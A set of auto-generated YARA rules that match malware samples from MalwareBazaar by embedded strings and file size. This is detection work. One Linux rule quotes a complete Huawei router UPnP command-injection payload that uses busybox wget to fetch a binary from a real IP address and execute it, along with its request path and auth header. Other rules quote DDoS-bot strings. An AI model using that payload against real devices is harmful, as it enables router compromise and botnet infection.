rule Windows_50cf85d037d2fe01a82a569ab2042458f92b58fea3d4a417bfe3c59a8c42e7ba
{
    meta:
        description = "Auto ML: 50cf85d037d2fe01a82a569ab2042458f92b58fea3d4a417bfe3c59a8c42e7ba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "d UUUU_`"
        $s5 = "lZ[YZ*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2063KB
        and all of them
}

rule Linux_50d189225163e37c71a56460701bffb50255e93489bd08b32633d93dd0b59c36
{
    meta:
        description = "Auto ML: 50d189225163e37c71a56460701bffb50255e93489bd08b32633d93dd0b59c36"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 147KB
        and all of them
}

rule Windows_0625a9efaf502b585558b4d5e8942ca543814e60bd53603c98a76e01a9e4f488
{
    meta:
        description = "Auto ML: 0625a9efaf502b585558b4d5e8942ca543814e60bd53603c98a76e01a9e4f488"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4589KB
        and all of them
}

rule Linux_50ec179db9a98b015b8462f1b093be2100fda3d0516b0b39e57b9ffbbf13db1d
{
    meta:
        description = "Auto ML: 50ec179db9a98b015b8462f1b093be2100fda3d0516b0b39e57b9ffbbf13db1d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!K=btz"
        $s2 = "dbv~gVU"
        $s3 = "NYiz8R"
        $s4 = "mId4y6"
        $s5 = "nzq/5Z"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 26KB
        and all of them
}

rule Windows_5114522e3999f4c6757cfe457bcc0fa1263fccf2bcbf742a1fec0f6cc81e5aa6
{
    meta:
        description = "Auto ML: 5114522e3999f4c6757cfe457bcc0fa1263fccf2bcbf742a1fec0f6cc81e5aa6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "d+c,CO"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6461KB
        and all of them
}

rule Windows_5134138e30037482cf3fee2a5c98ffb05cb45acf6e6012757f18a2f1c92a6a03
{
    meta:
        description = "Auto ML: 5134138e30037482cf3fee2a5c98ffb05cb45acf6e6012757f18a2f1c92a6a03"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<ResetNetStatus>b__60_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 719KB
        and all of them
}

rule Windows_516e1b54eb023601fd25f0c943fccb91dee0335c714515e2e263eb927642ebbe
{
    meta:
        description = "Auto ML: 516e1b54eb023601fd25f0c943fccb91dee0335c714515e2e263eb927642ebbe"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<>c__DisplayClass0_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 931KB
        and all of them
}

rule Windows_51745628d4c34c4b7fc4da7451ef6ca27fdeb2183423be4cc44dc67400184196
{
    meta:
        description = "Auto ML: 51745628d4c34c4b7fc4da7451ef6ca27fdeb2183423be4cc44dc67400184196"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "dRich{"
        $s3 = "B.idata"
        $s4 = "@.themida"
        $s5 = "`.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 19837KB
        and all of them
}

rule Windows_51975425e3be5bbe808e1dbe7b191382f4f1597a025f622f0462da72b31d5e38
{
    meta:
        description = "Auto ML: 51975425e3be5bbe808e1dbe7b191382f4f1597a025f622f0462da72b31d5e38"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "SQSSSPW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 412KB
        and all of them
}

rule Windows_5197d164e1d16e3fe5c6dcb412a37dca383710da9ed4ee3a8396a4a70c77e456
{
    meta:
        description = "Auto ML: 5197d164e1d16e3fe5c6dcb412a37dca383710da9ed4ee3a8396a4a70c77e456"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "VjR4fil+v"
        $s5 = "lFpHmKO\"UUgLrTcEoyfOQqsk5I=LyPViR4fml+v3R03"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1848KB
        and all of them
}

rule Windows_51f24503d32c9e10a2e7afe027d438380d007cd1566e5399cc52b039cacdb2ea
{
    meta:
        description = "Auto ML: 51f24503d32c9e10a2e7afe027d438380d007cd1566e5399cc52b039cacdb2ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1285KB
        and all of them
}

rule Windows_521f14c5c2d45f03ca468a5ea3cb1532c0b25ecaa6a8561a8100bdd99f64f9be
{
    meta:
        description = "Auto ML: 521f14c5c2d45f03ca468a5ea3cb1532c0b25ecaa6a8561a8100bdd99f64f9be"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0WWWWW"
        $s5 = "QQSVWd"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 252KB
        and all of them
}

rule Linux_52371fcb121f380c601d660c7a3baacfcd0d20cdb6f28ce884c66d7c43010dd8
{
    meta:
        description = "Auto ML: 52371fcb121f380c601d660c7a3baacfcd0d20cdb6f28ce884c66d7c43010dd8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ff4Jfg"
        $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s4 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
        $s5 = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 115KB
        and all of them
}

rule Linux_0694efe67f4e22a5989a53f5279a760870b75688c7cc590ed3eb629e9f25401f
{
    meta:
        description = "Auto ML: 0694efe67f4e22a5989a53f5279a760870b75688c7cc590ed3eb629e9f25401f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "CvUPX!"
        $s2 = "E;N^qQ"
        $s3 = "/Wc~-YE(A/"
        $s4 = "BVGKm2"
        $s5 = "Au9lQyP"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 21KB
        and all of them
}

rule Windows_525d9778857fedb37303bdcb4b6f8fa57c1bf8c1a62ca25365277d4efb3265e8
{
    meta:
        description = "Auto ML: 525d9778857fedb37303bdcb4b6f8fa57c1bf8c1a62ca25365277d4efb3265e8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1243KB
        and all of them
}

rule Windows_526539d41092e31a6eb4097cc93b55285d758b41e992d11c1819767306f08f30
{
    meta:
        description = "Auto ML: 526539d41092e31a6eb4097cc93b55285d758b41e992d11c1819767306f08f30"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich<>"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".didat"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1034KB
        and all of them
}

rule Windows_527b2b31bcee94426ba4d03e16a941e21c739da69e9a40f023631fdbfc29fae5
{
    meta:
        description = "Auto ML: 527b2b31bcee94426ba4d03e16a941e21c739da69e9a40f023631fdbfc29fae5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "textBox10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 40960KB
        and all of them
}

rule Windows_52bed4d9c0fdb81bdc4abfd46b47b8f8fa2dcdd570fcdc94f300f087c8b3aa65
{
    meta:
        description = "Auto ML: 52bed4d9c0fdb81bdc4abfd46b47b8f8fa2dcdd570fcdc94f300f087c8b3aa65"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.reloc"
        $s3 = "B.rsrc"
        $s4 = "ffefeeffefea("
        $s5 = "fefefeffea"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 204KB
        and all of them
}

rule Windows_52dd30e29abf61d4e6ea0ca34e23649fe98c73d6529c5b5253825660f0d0f919
{
    meta:
        description = "Auto ML: 52dd30e29abf61d4e6ea0ca34e23649fe98c73d6529c5b5253825660f0d0f919"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5081KB
        and all of them
}

rule Windows_52ec0772eb7a1e76c0f99e8dcc8b377a9de782fb744d5be7386ce8c765162409
{
    meta:
        description = "Auto ML: 52ec0772eb7a1e76c0f99e8dcc8b377a9de782fb744d5be7386ce8c765162409"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "s495LCB"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4438KB
        and all of them
}

rule Windows_52ecf2eaeed9b8deafb3a699cb573d5f1c90872290c3cfdd0355ca241b9f6f5b
{
    meta:
        description = "Auto ML: 52ecf2eaeed9b8deafb3a699cb573d5f1c90872290c3cfdd0355ca241b9f6f5b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 697KB
        and all of them
}

rule Windows_5327308fee51fc6bb95996c4185c4cfcbac580b747d79363c7cf66505f3ff6db
{
    meta:
        description = "Auto ML: 5327308fee51fc6bb95996c4185c4cfcbac580b747d79363c7cf66505f3ff6db"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = ".gfids"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1552KB
        and all of them
}

rule Linux_533775b86d8c4674b995ee08ad1394702e2cda7d5aa5ce98dac14dbd25d85f7b
{
    meta:
        description = "Auto ML: 533775b86d8c4674b995ee08ad1394702e2cda7d5aa5ce98dac14dbd25d85f7b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 185.224.128.187 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"
        $s2 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s3 = "Connection: keep-alive"
        $s4 = "Accept: */*"
        $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 165KB
        and all of them
}

rule Windows_5337ee7f8aa1a26585d70bc5b2e2aacd0f3346eb638e8b80fabf6ca36df4963e
{
    meta:
        description = "Auto ML: 5337ee7f8aa1a26585d70bc5b2e2aacd0f3346eb638e8b80fabf6ca36df4963e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".xodogu"
        $s5 = ".vohom"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 308KB
        and all of them
}

rule Windows_06964dd3189bad530f3e1f1b866ccd300672eac8d3889ff327724927770b0389
{
    meta:
        description = "Auto ML: 06964dd3189bad530f3e1f1b866ccd300672eac8d3889ff327724927770b0389"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Action`10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 48KB
        and all of them
}

rule Windows_539471f0ad07c5b7ad10b55ed4f9ded8f481384f3fdb1a7395e657010e00986a
{
    meta:
        description = "Auto ML: 539471f0ad07c5b7ad10b55ed4f9ded8f481384f3fdb1a7395e657010e00986a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "RQCWOIROIQJWZORIQOVITQNOCROIQWX"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "fffff."
        $s5 = "ffffff."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 689KB
        and all of them
}

rule Linux_53b9f7cc74705d5e8c330b5054e55e04b3dc9a3bf83fb9a07f8dcb4dd7a84963
{
    meta:
        description = "Auto ML: 53b9f7cc74705d5e8c330b5054e55e04b3dc9a3bf83fb9a07f8dcb4dd7a84963"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Ewi2iaxhC2uhn7QnP0Wq/CBAxVVua50Gt3M3nIbJw/ObuIeJOO49bDdl_dIBMN/JCHwMUd4GXVm1MHzgYk7"
        $s2 = "/lib64/ld-linux-x86-64.so.2"
        $s3 = "AUATUSH"
        $s4 = "[]A\\A]A^A_"
        $s5 = "SUATAUAVAWH"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 3060KB
        and all of them
}

rule Linux_5437dda04c8ce748054771bd8bd95c224a09997e319d35ade5e5d004fa247194
{
    meta:
        description = "Auto ML: 5437dda04c8ce748054771bd8bd95c224a09997e319d35ade5e5d004fa247194"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "EBUPX!,"
        $s2 = "f+p:YDh"
        $s3 = "S`@rrI"
        $s4 = "{<PA4`5A?C2D"
        $s5 = "VS3VS["

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Linux_548da0db38e363a75d4d386da3f2bcde5b2c2e1d88168f4e77275db55924c1c6
{
    meta:
        description = "Auto ML: 548da0db38e363a75d4d386da3f2bcde5b2c2e1d88168f4e77275db55924c1c6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "thR~F@"
        $s2 = "n!(LGG"
        $s3 = "c}LvdlS"
        $s4 = "$Ly?is/"
        $s5 = "g5v\\IlY"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB
        and all of them
}

rule Windows_5492748ca440d8925ca1c6520e50400757ab1631e51f5936a008cffcb8ddfec9
{
    meta:
        description = "Auto ML: 5492748ca440d8925ca1c6520e50400757ab1631e51f5936a008cffcb8ddfec9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "G:CvfV"
        $s3 = "\\,VTbm"
        $s4 = "k%jPJo"
        $s5 = "s.f}db"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1022KB
        and all of them
}

rule Linux_54b47777007f18aa301f9ad1b8bc8abcd128b889e373d7e8f56a7bb3b117a116
{
    meta:
        description = "Auto ML: 54b47777007f18aa301f9ad1b8bc8abcd128b889e373d7e8f56a7bb3b117a116"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "Cookie:"
        $s4 = "[http flood] headers: \"%s\""
        $s5 = "/sbin/"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 88KB
        and all of them
}

rule Windows_54bbe2729a4337e528aa30d723c0b7e6054cb611fbacd910b770010d3b0545ec
{
    meta:
        description = "Auto ML: 54bbe2729a4337e528aa30d723c0b7e6054cb611fbacd910b770010d3b0545ec"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "Instu`"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 866KB
        and all of them
}

rule Windows_5504d377694e9bcfed6be2f122affa42fa9c0847c8d23561b52ded5bbd12dfff
{
    meta:
        description = "Auto ML: 5504d377694e9bcfed6be2f122affa42fa9c0847c8d23561b52ded5bbd12dfff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6621KB
        and all of them
}

rule Windows_557c5b6678b5b3badb6a7703e4491a9b354a353cdef83c4f6415b422cd17a999
{
    meta:
        description = "Auto ML: 557c5b6678b5b3badb6a7703e4491a9b354a353cdef83c4f6415b422cd17a999"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "%N\"UUU@XV"
        $s5 = "c UUUUj_"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7188KB
        and all of them
}

rule Linux_561a61b05c518ff7a2fb8fbb127aabe5b51fc736e1e7285aff3083b494a16004
{
    meta:
        description = "Auto ML: 561a61b05c518ff7a2fb8fbb127aabe5b51fc736e1e7285aff3083b494a16004"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HN^NuNV"
        $s2 = "N^NuNV"
        $s3 = "OHWHQHy"
        $s4 = "/BQxHoQxB"
        $s5 = "HoPpHoP"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB
        and all of them
}

rule Linux_06e1e5c18b69560b06263e86b7f620bdca8d640c53f163b0a653b86e07713306
{
    meta:
        description = "Auto ML: 06e1e5c18b69560b06263e86b7f620bdca8d640c53f163b0a653b86e07713306"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 123KB
        and all of them
}

rule Windows_56b4f307126f78e16ac2ad2e4044de61cb207864bf194ba6702108cb65475369
{
    meta:
        description = "Auto ML: 56b4f307126f78e16ac2ad2e4044de61cb207864bf194ba6702108cb65475369"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "q#Rich="
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "L=cGMT|&f"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 503KB
        and all of them
}

rule Windows_56be2a8ce03a8cd28e291f51297f68cde648cd0e7245bb2686706481a52df619
{
    meta:
        description = "Auto ML: 56be2a8ce03a8cd28e291f51297f68cde648cd0e7245bb2686706481a52df619"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Linux_56d3c57a6ac82fe6f8175cc31d6d70bbe874cd48e760d642359106f15913cfe1
{
    meta:
        description = "Auto ML: 56d3c57a6ac82fe6f8175cc31d6d70bbe874cd48e760d642359106f15913cfe1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ";|$(t:WWj"
        $s2 = ";|$(t:PPj"
        $s3 = "toPPj/U"
        $s4 = "D$$PSV"
        $s5 = "E4tmPh"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 67KB
        and all of them
}

rule Windows_56f2e82c10506d2ad399bbcd547fb4869909d7c9a64a3add918bf7534640d323
{
    meta:
        description = "Auto ML: 56f2e82c10506d2ad399bbcd547fb4869909d7c9a64a3add918bf7534640d323"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4004KB
        and all of them
}

rule Windows_5712d6afcbf5c83892bf3f622e946b7461ad04f3663ef44a29fab1ab3ce67730
{
    meta:
        description = "Auto ML: 5712d6afcbf5c83892bf3f622e946b7461ad04f3663ef44a29fab1ab3ce67730"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP_"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 820KB
        and all of them
}

rule Windows_5719504e2f4e976c8ce6fbfda399b80273e783ff05f61dfd1f1bd4737f0bde8a
{
    meta:
        description = "Auto ML: 5719504e2f4e976c8ce6fbfda399b80273e783ff05f61dfd1f1bd4737f0bde8a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SVWuH3"
        $s5 = "uBhb4@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 247KB
        and all of them
}

rule Linux_572265e043fcd3068bb32bbc7f495071875cc958f5066a80b47976579fcacb5d
{
    meta:
        description = "Auto ML: 572265e043fcd3068bb32bbc7f495071875cc958f5066a80b47976579fcacb5d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "Cookie:"
        $s4 = "[http flood] headers: \"%s\""
        $s5 = "/sbin/"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB
        and all of them
}

rule Windows_5769990f534b9e77b10af7b86276d41673e4e5e81ee2be5768f838e838299cff
{
    meta:
        description = "Auto ML: 5769990f534b9e77b10af7b86276d41673e4e5e81ee2be5768f838e838299cff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1275KB
        and all of them
}

rule Windows_57718e813be532410d6612dbd6fbd43ff94d900aee8b6defa03f27039805506f
{
    meta:
        description = "Auto ML: 57718e813be532410d6612dbd6fbd43ff94d900aee8b6defa03f27039805506f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "uRFGHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1416KB
        and all of them
}

rule Windows_577630ab8871c11387fde67ae8791d81f96e3d3ec8db98a58ed5346c59f51229
{
    meta:
        description = "Auto ML: 577630ab8871c11387fde67ae8791d81f96e3d3ec8db98a58ed5346c59f51229"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "u>ht~B"
        $s5 = "0SSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 352KB
        and all of them
}

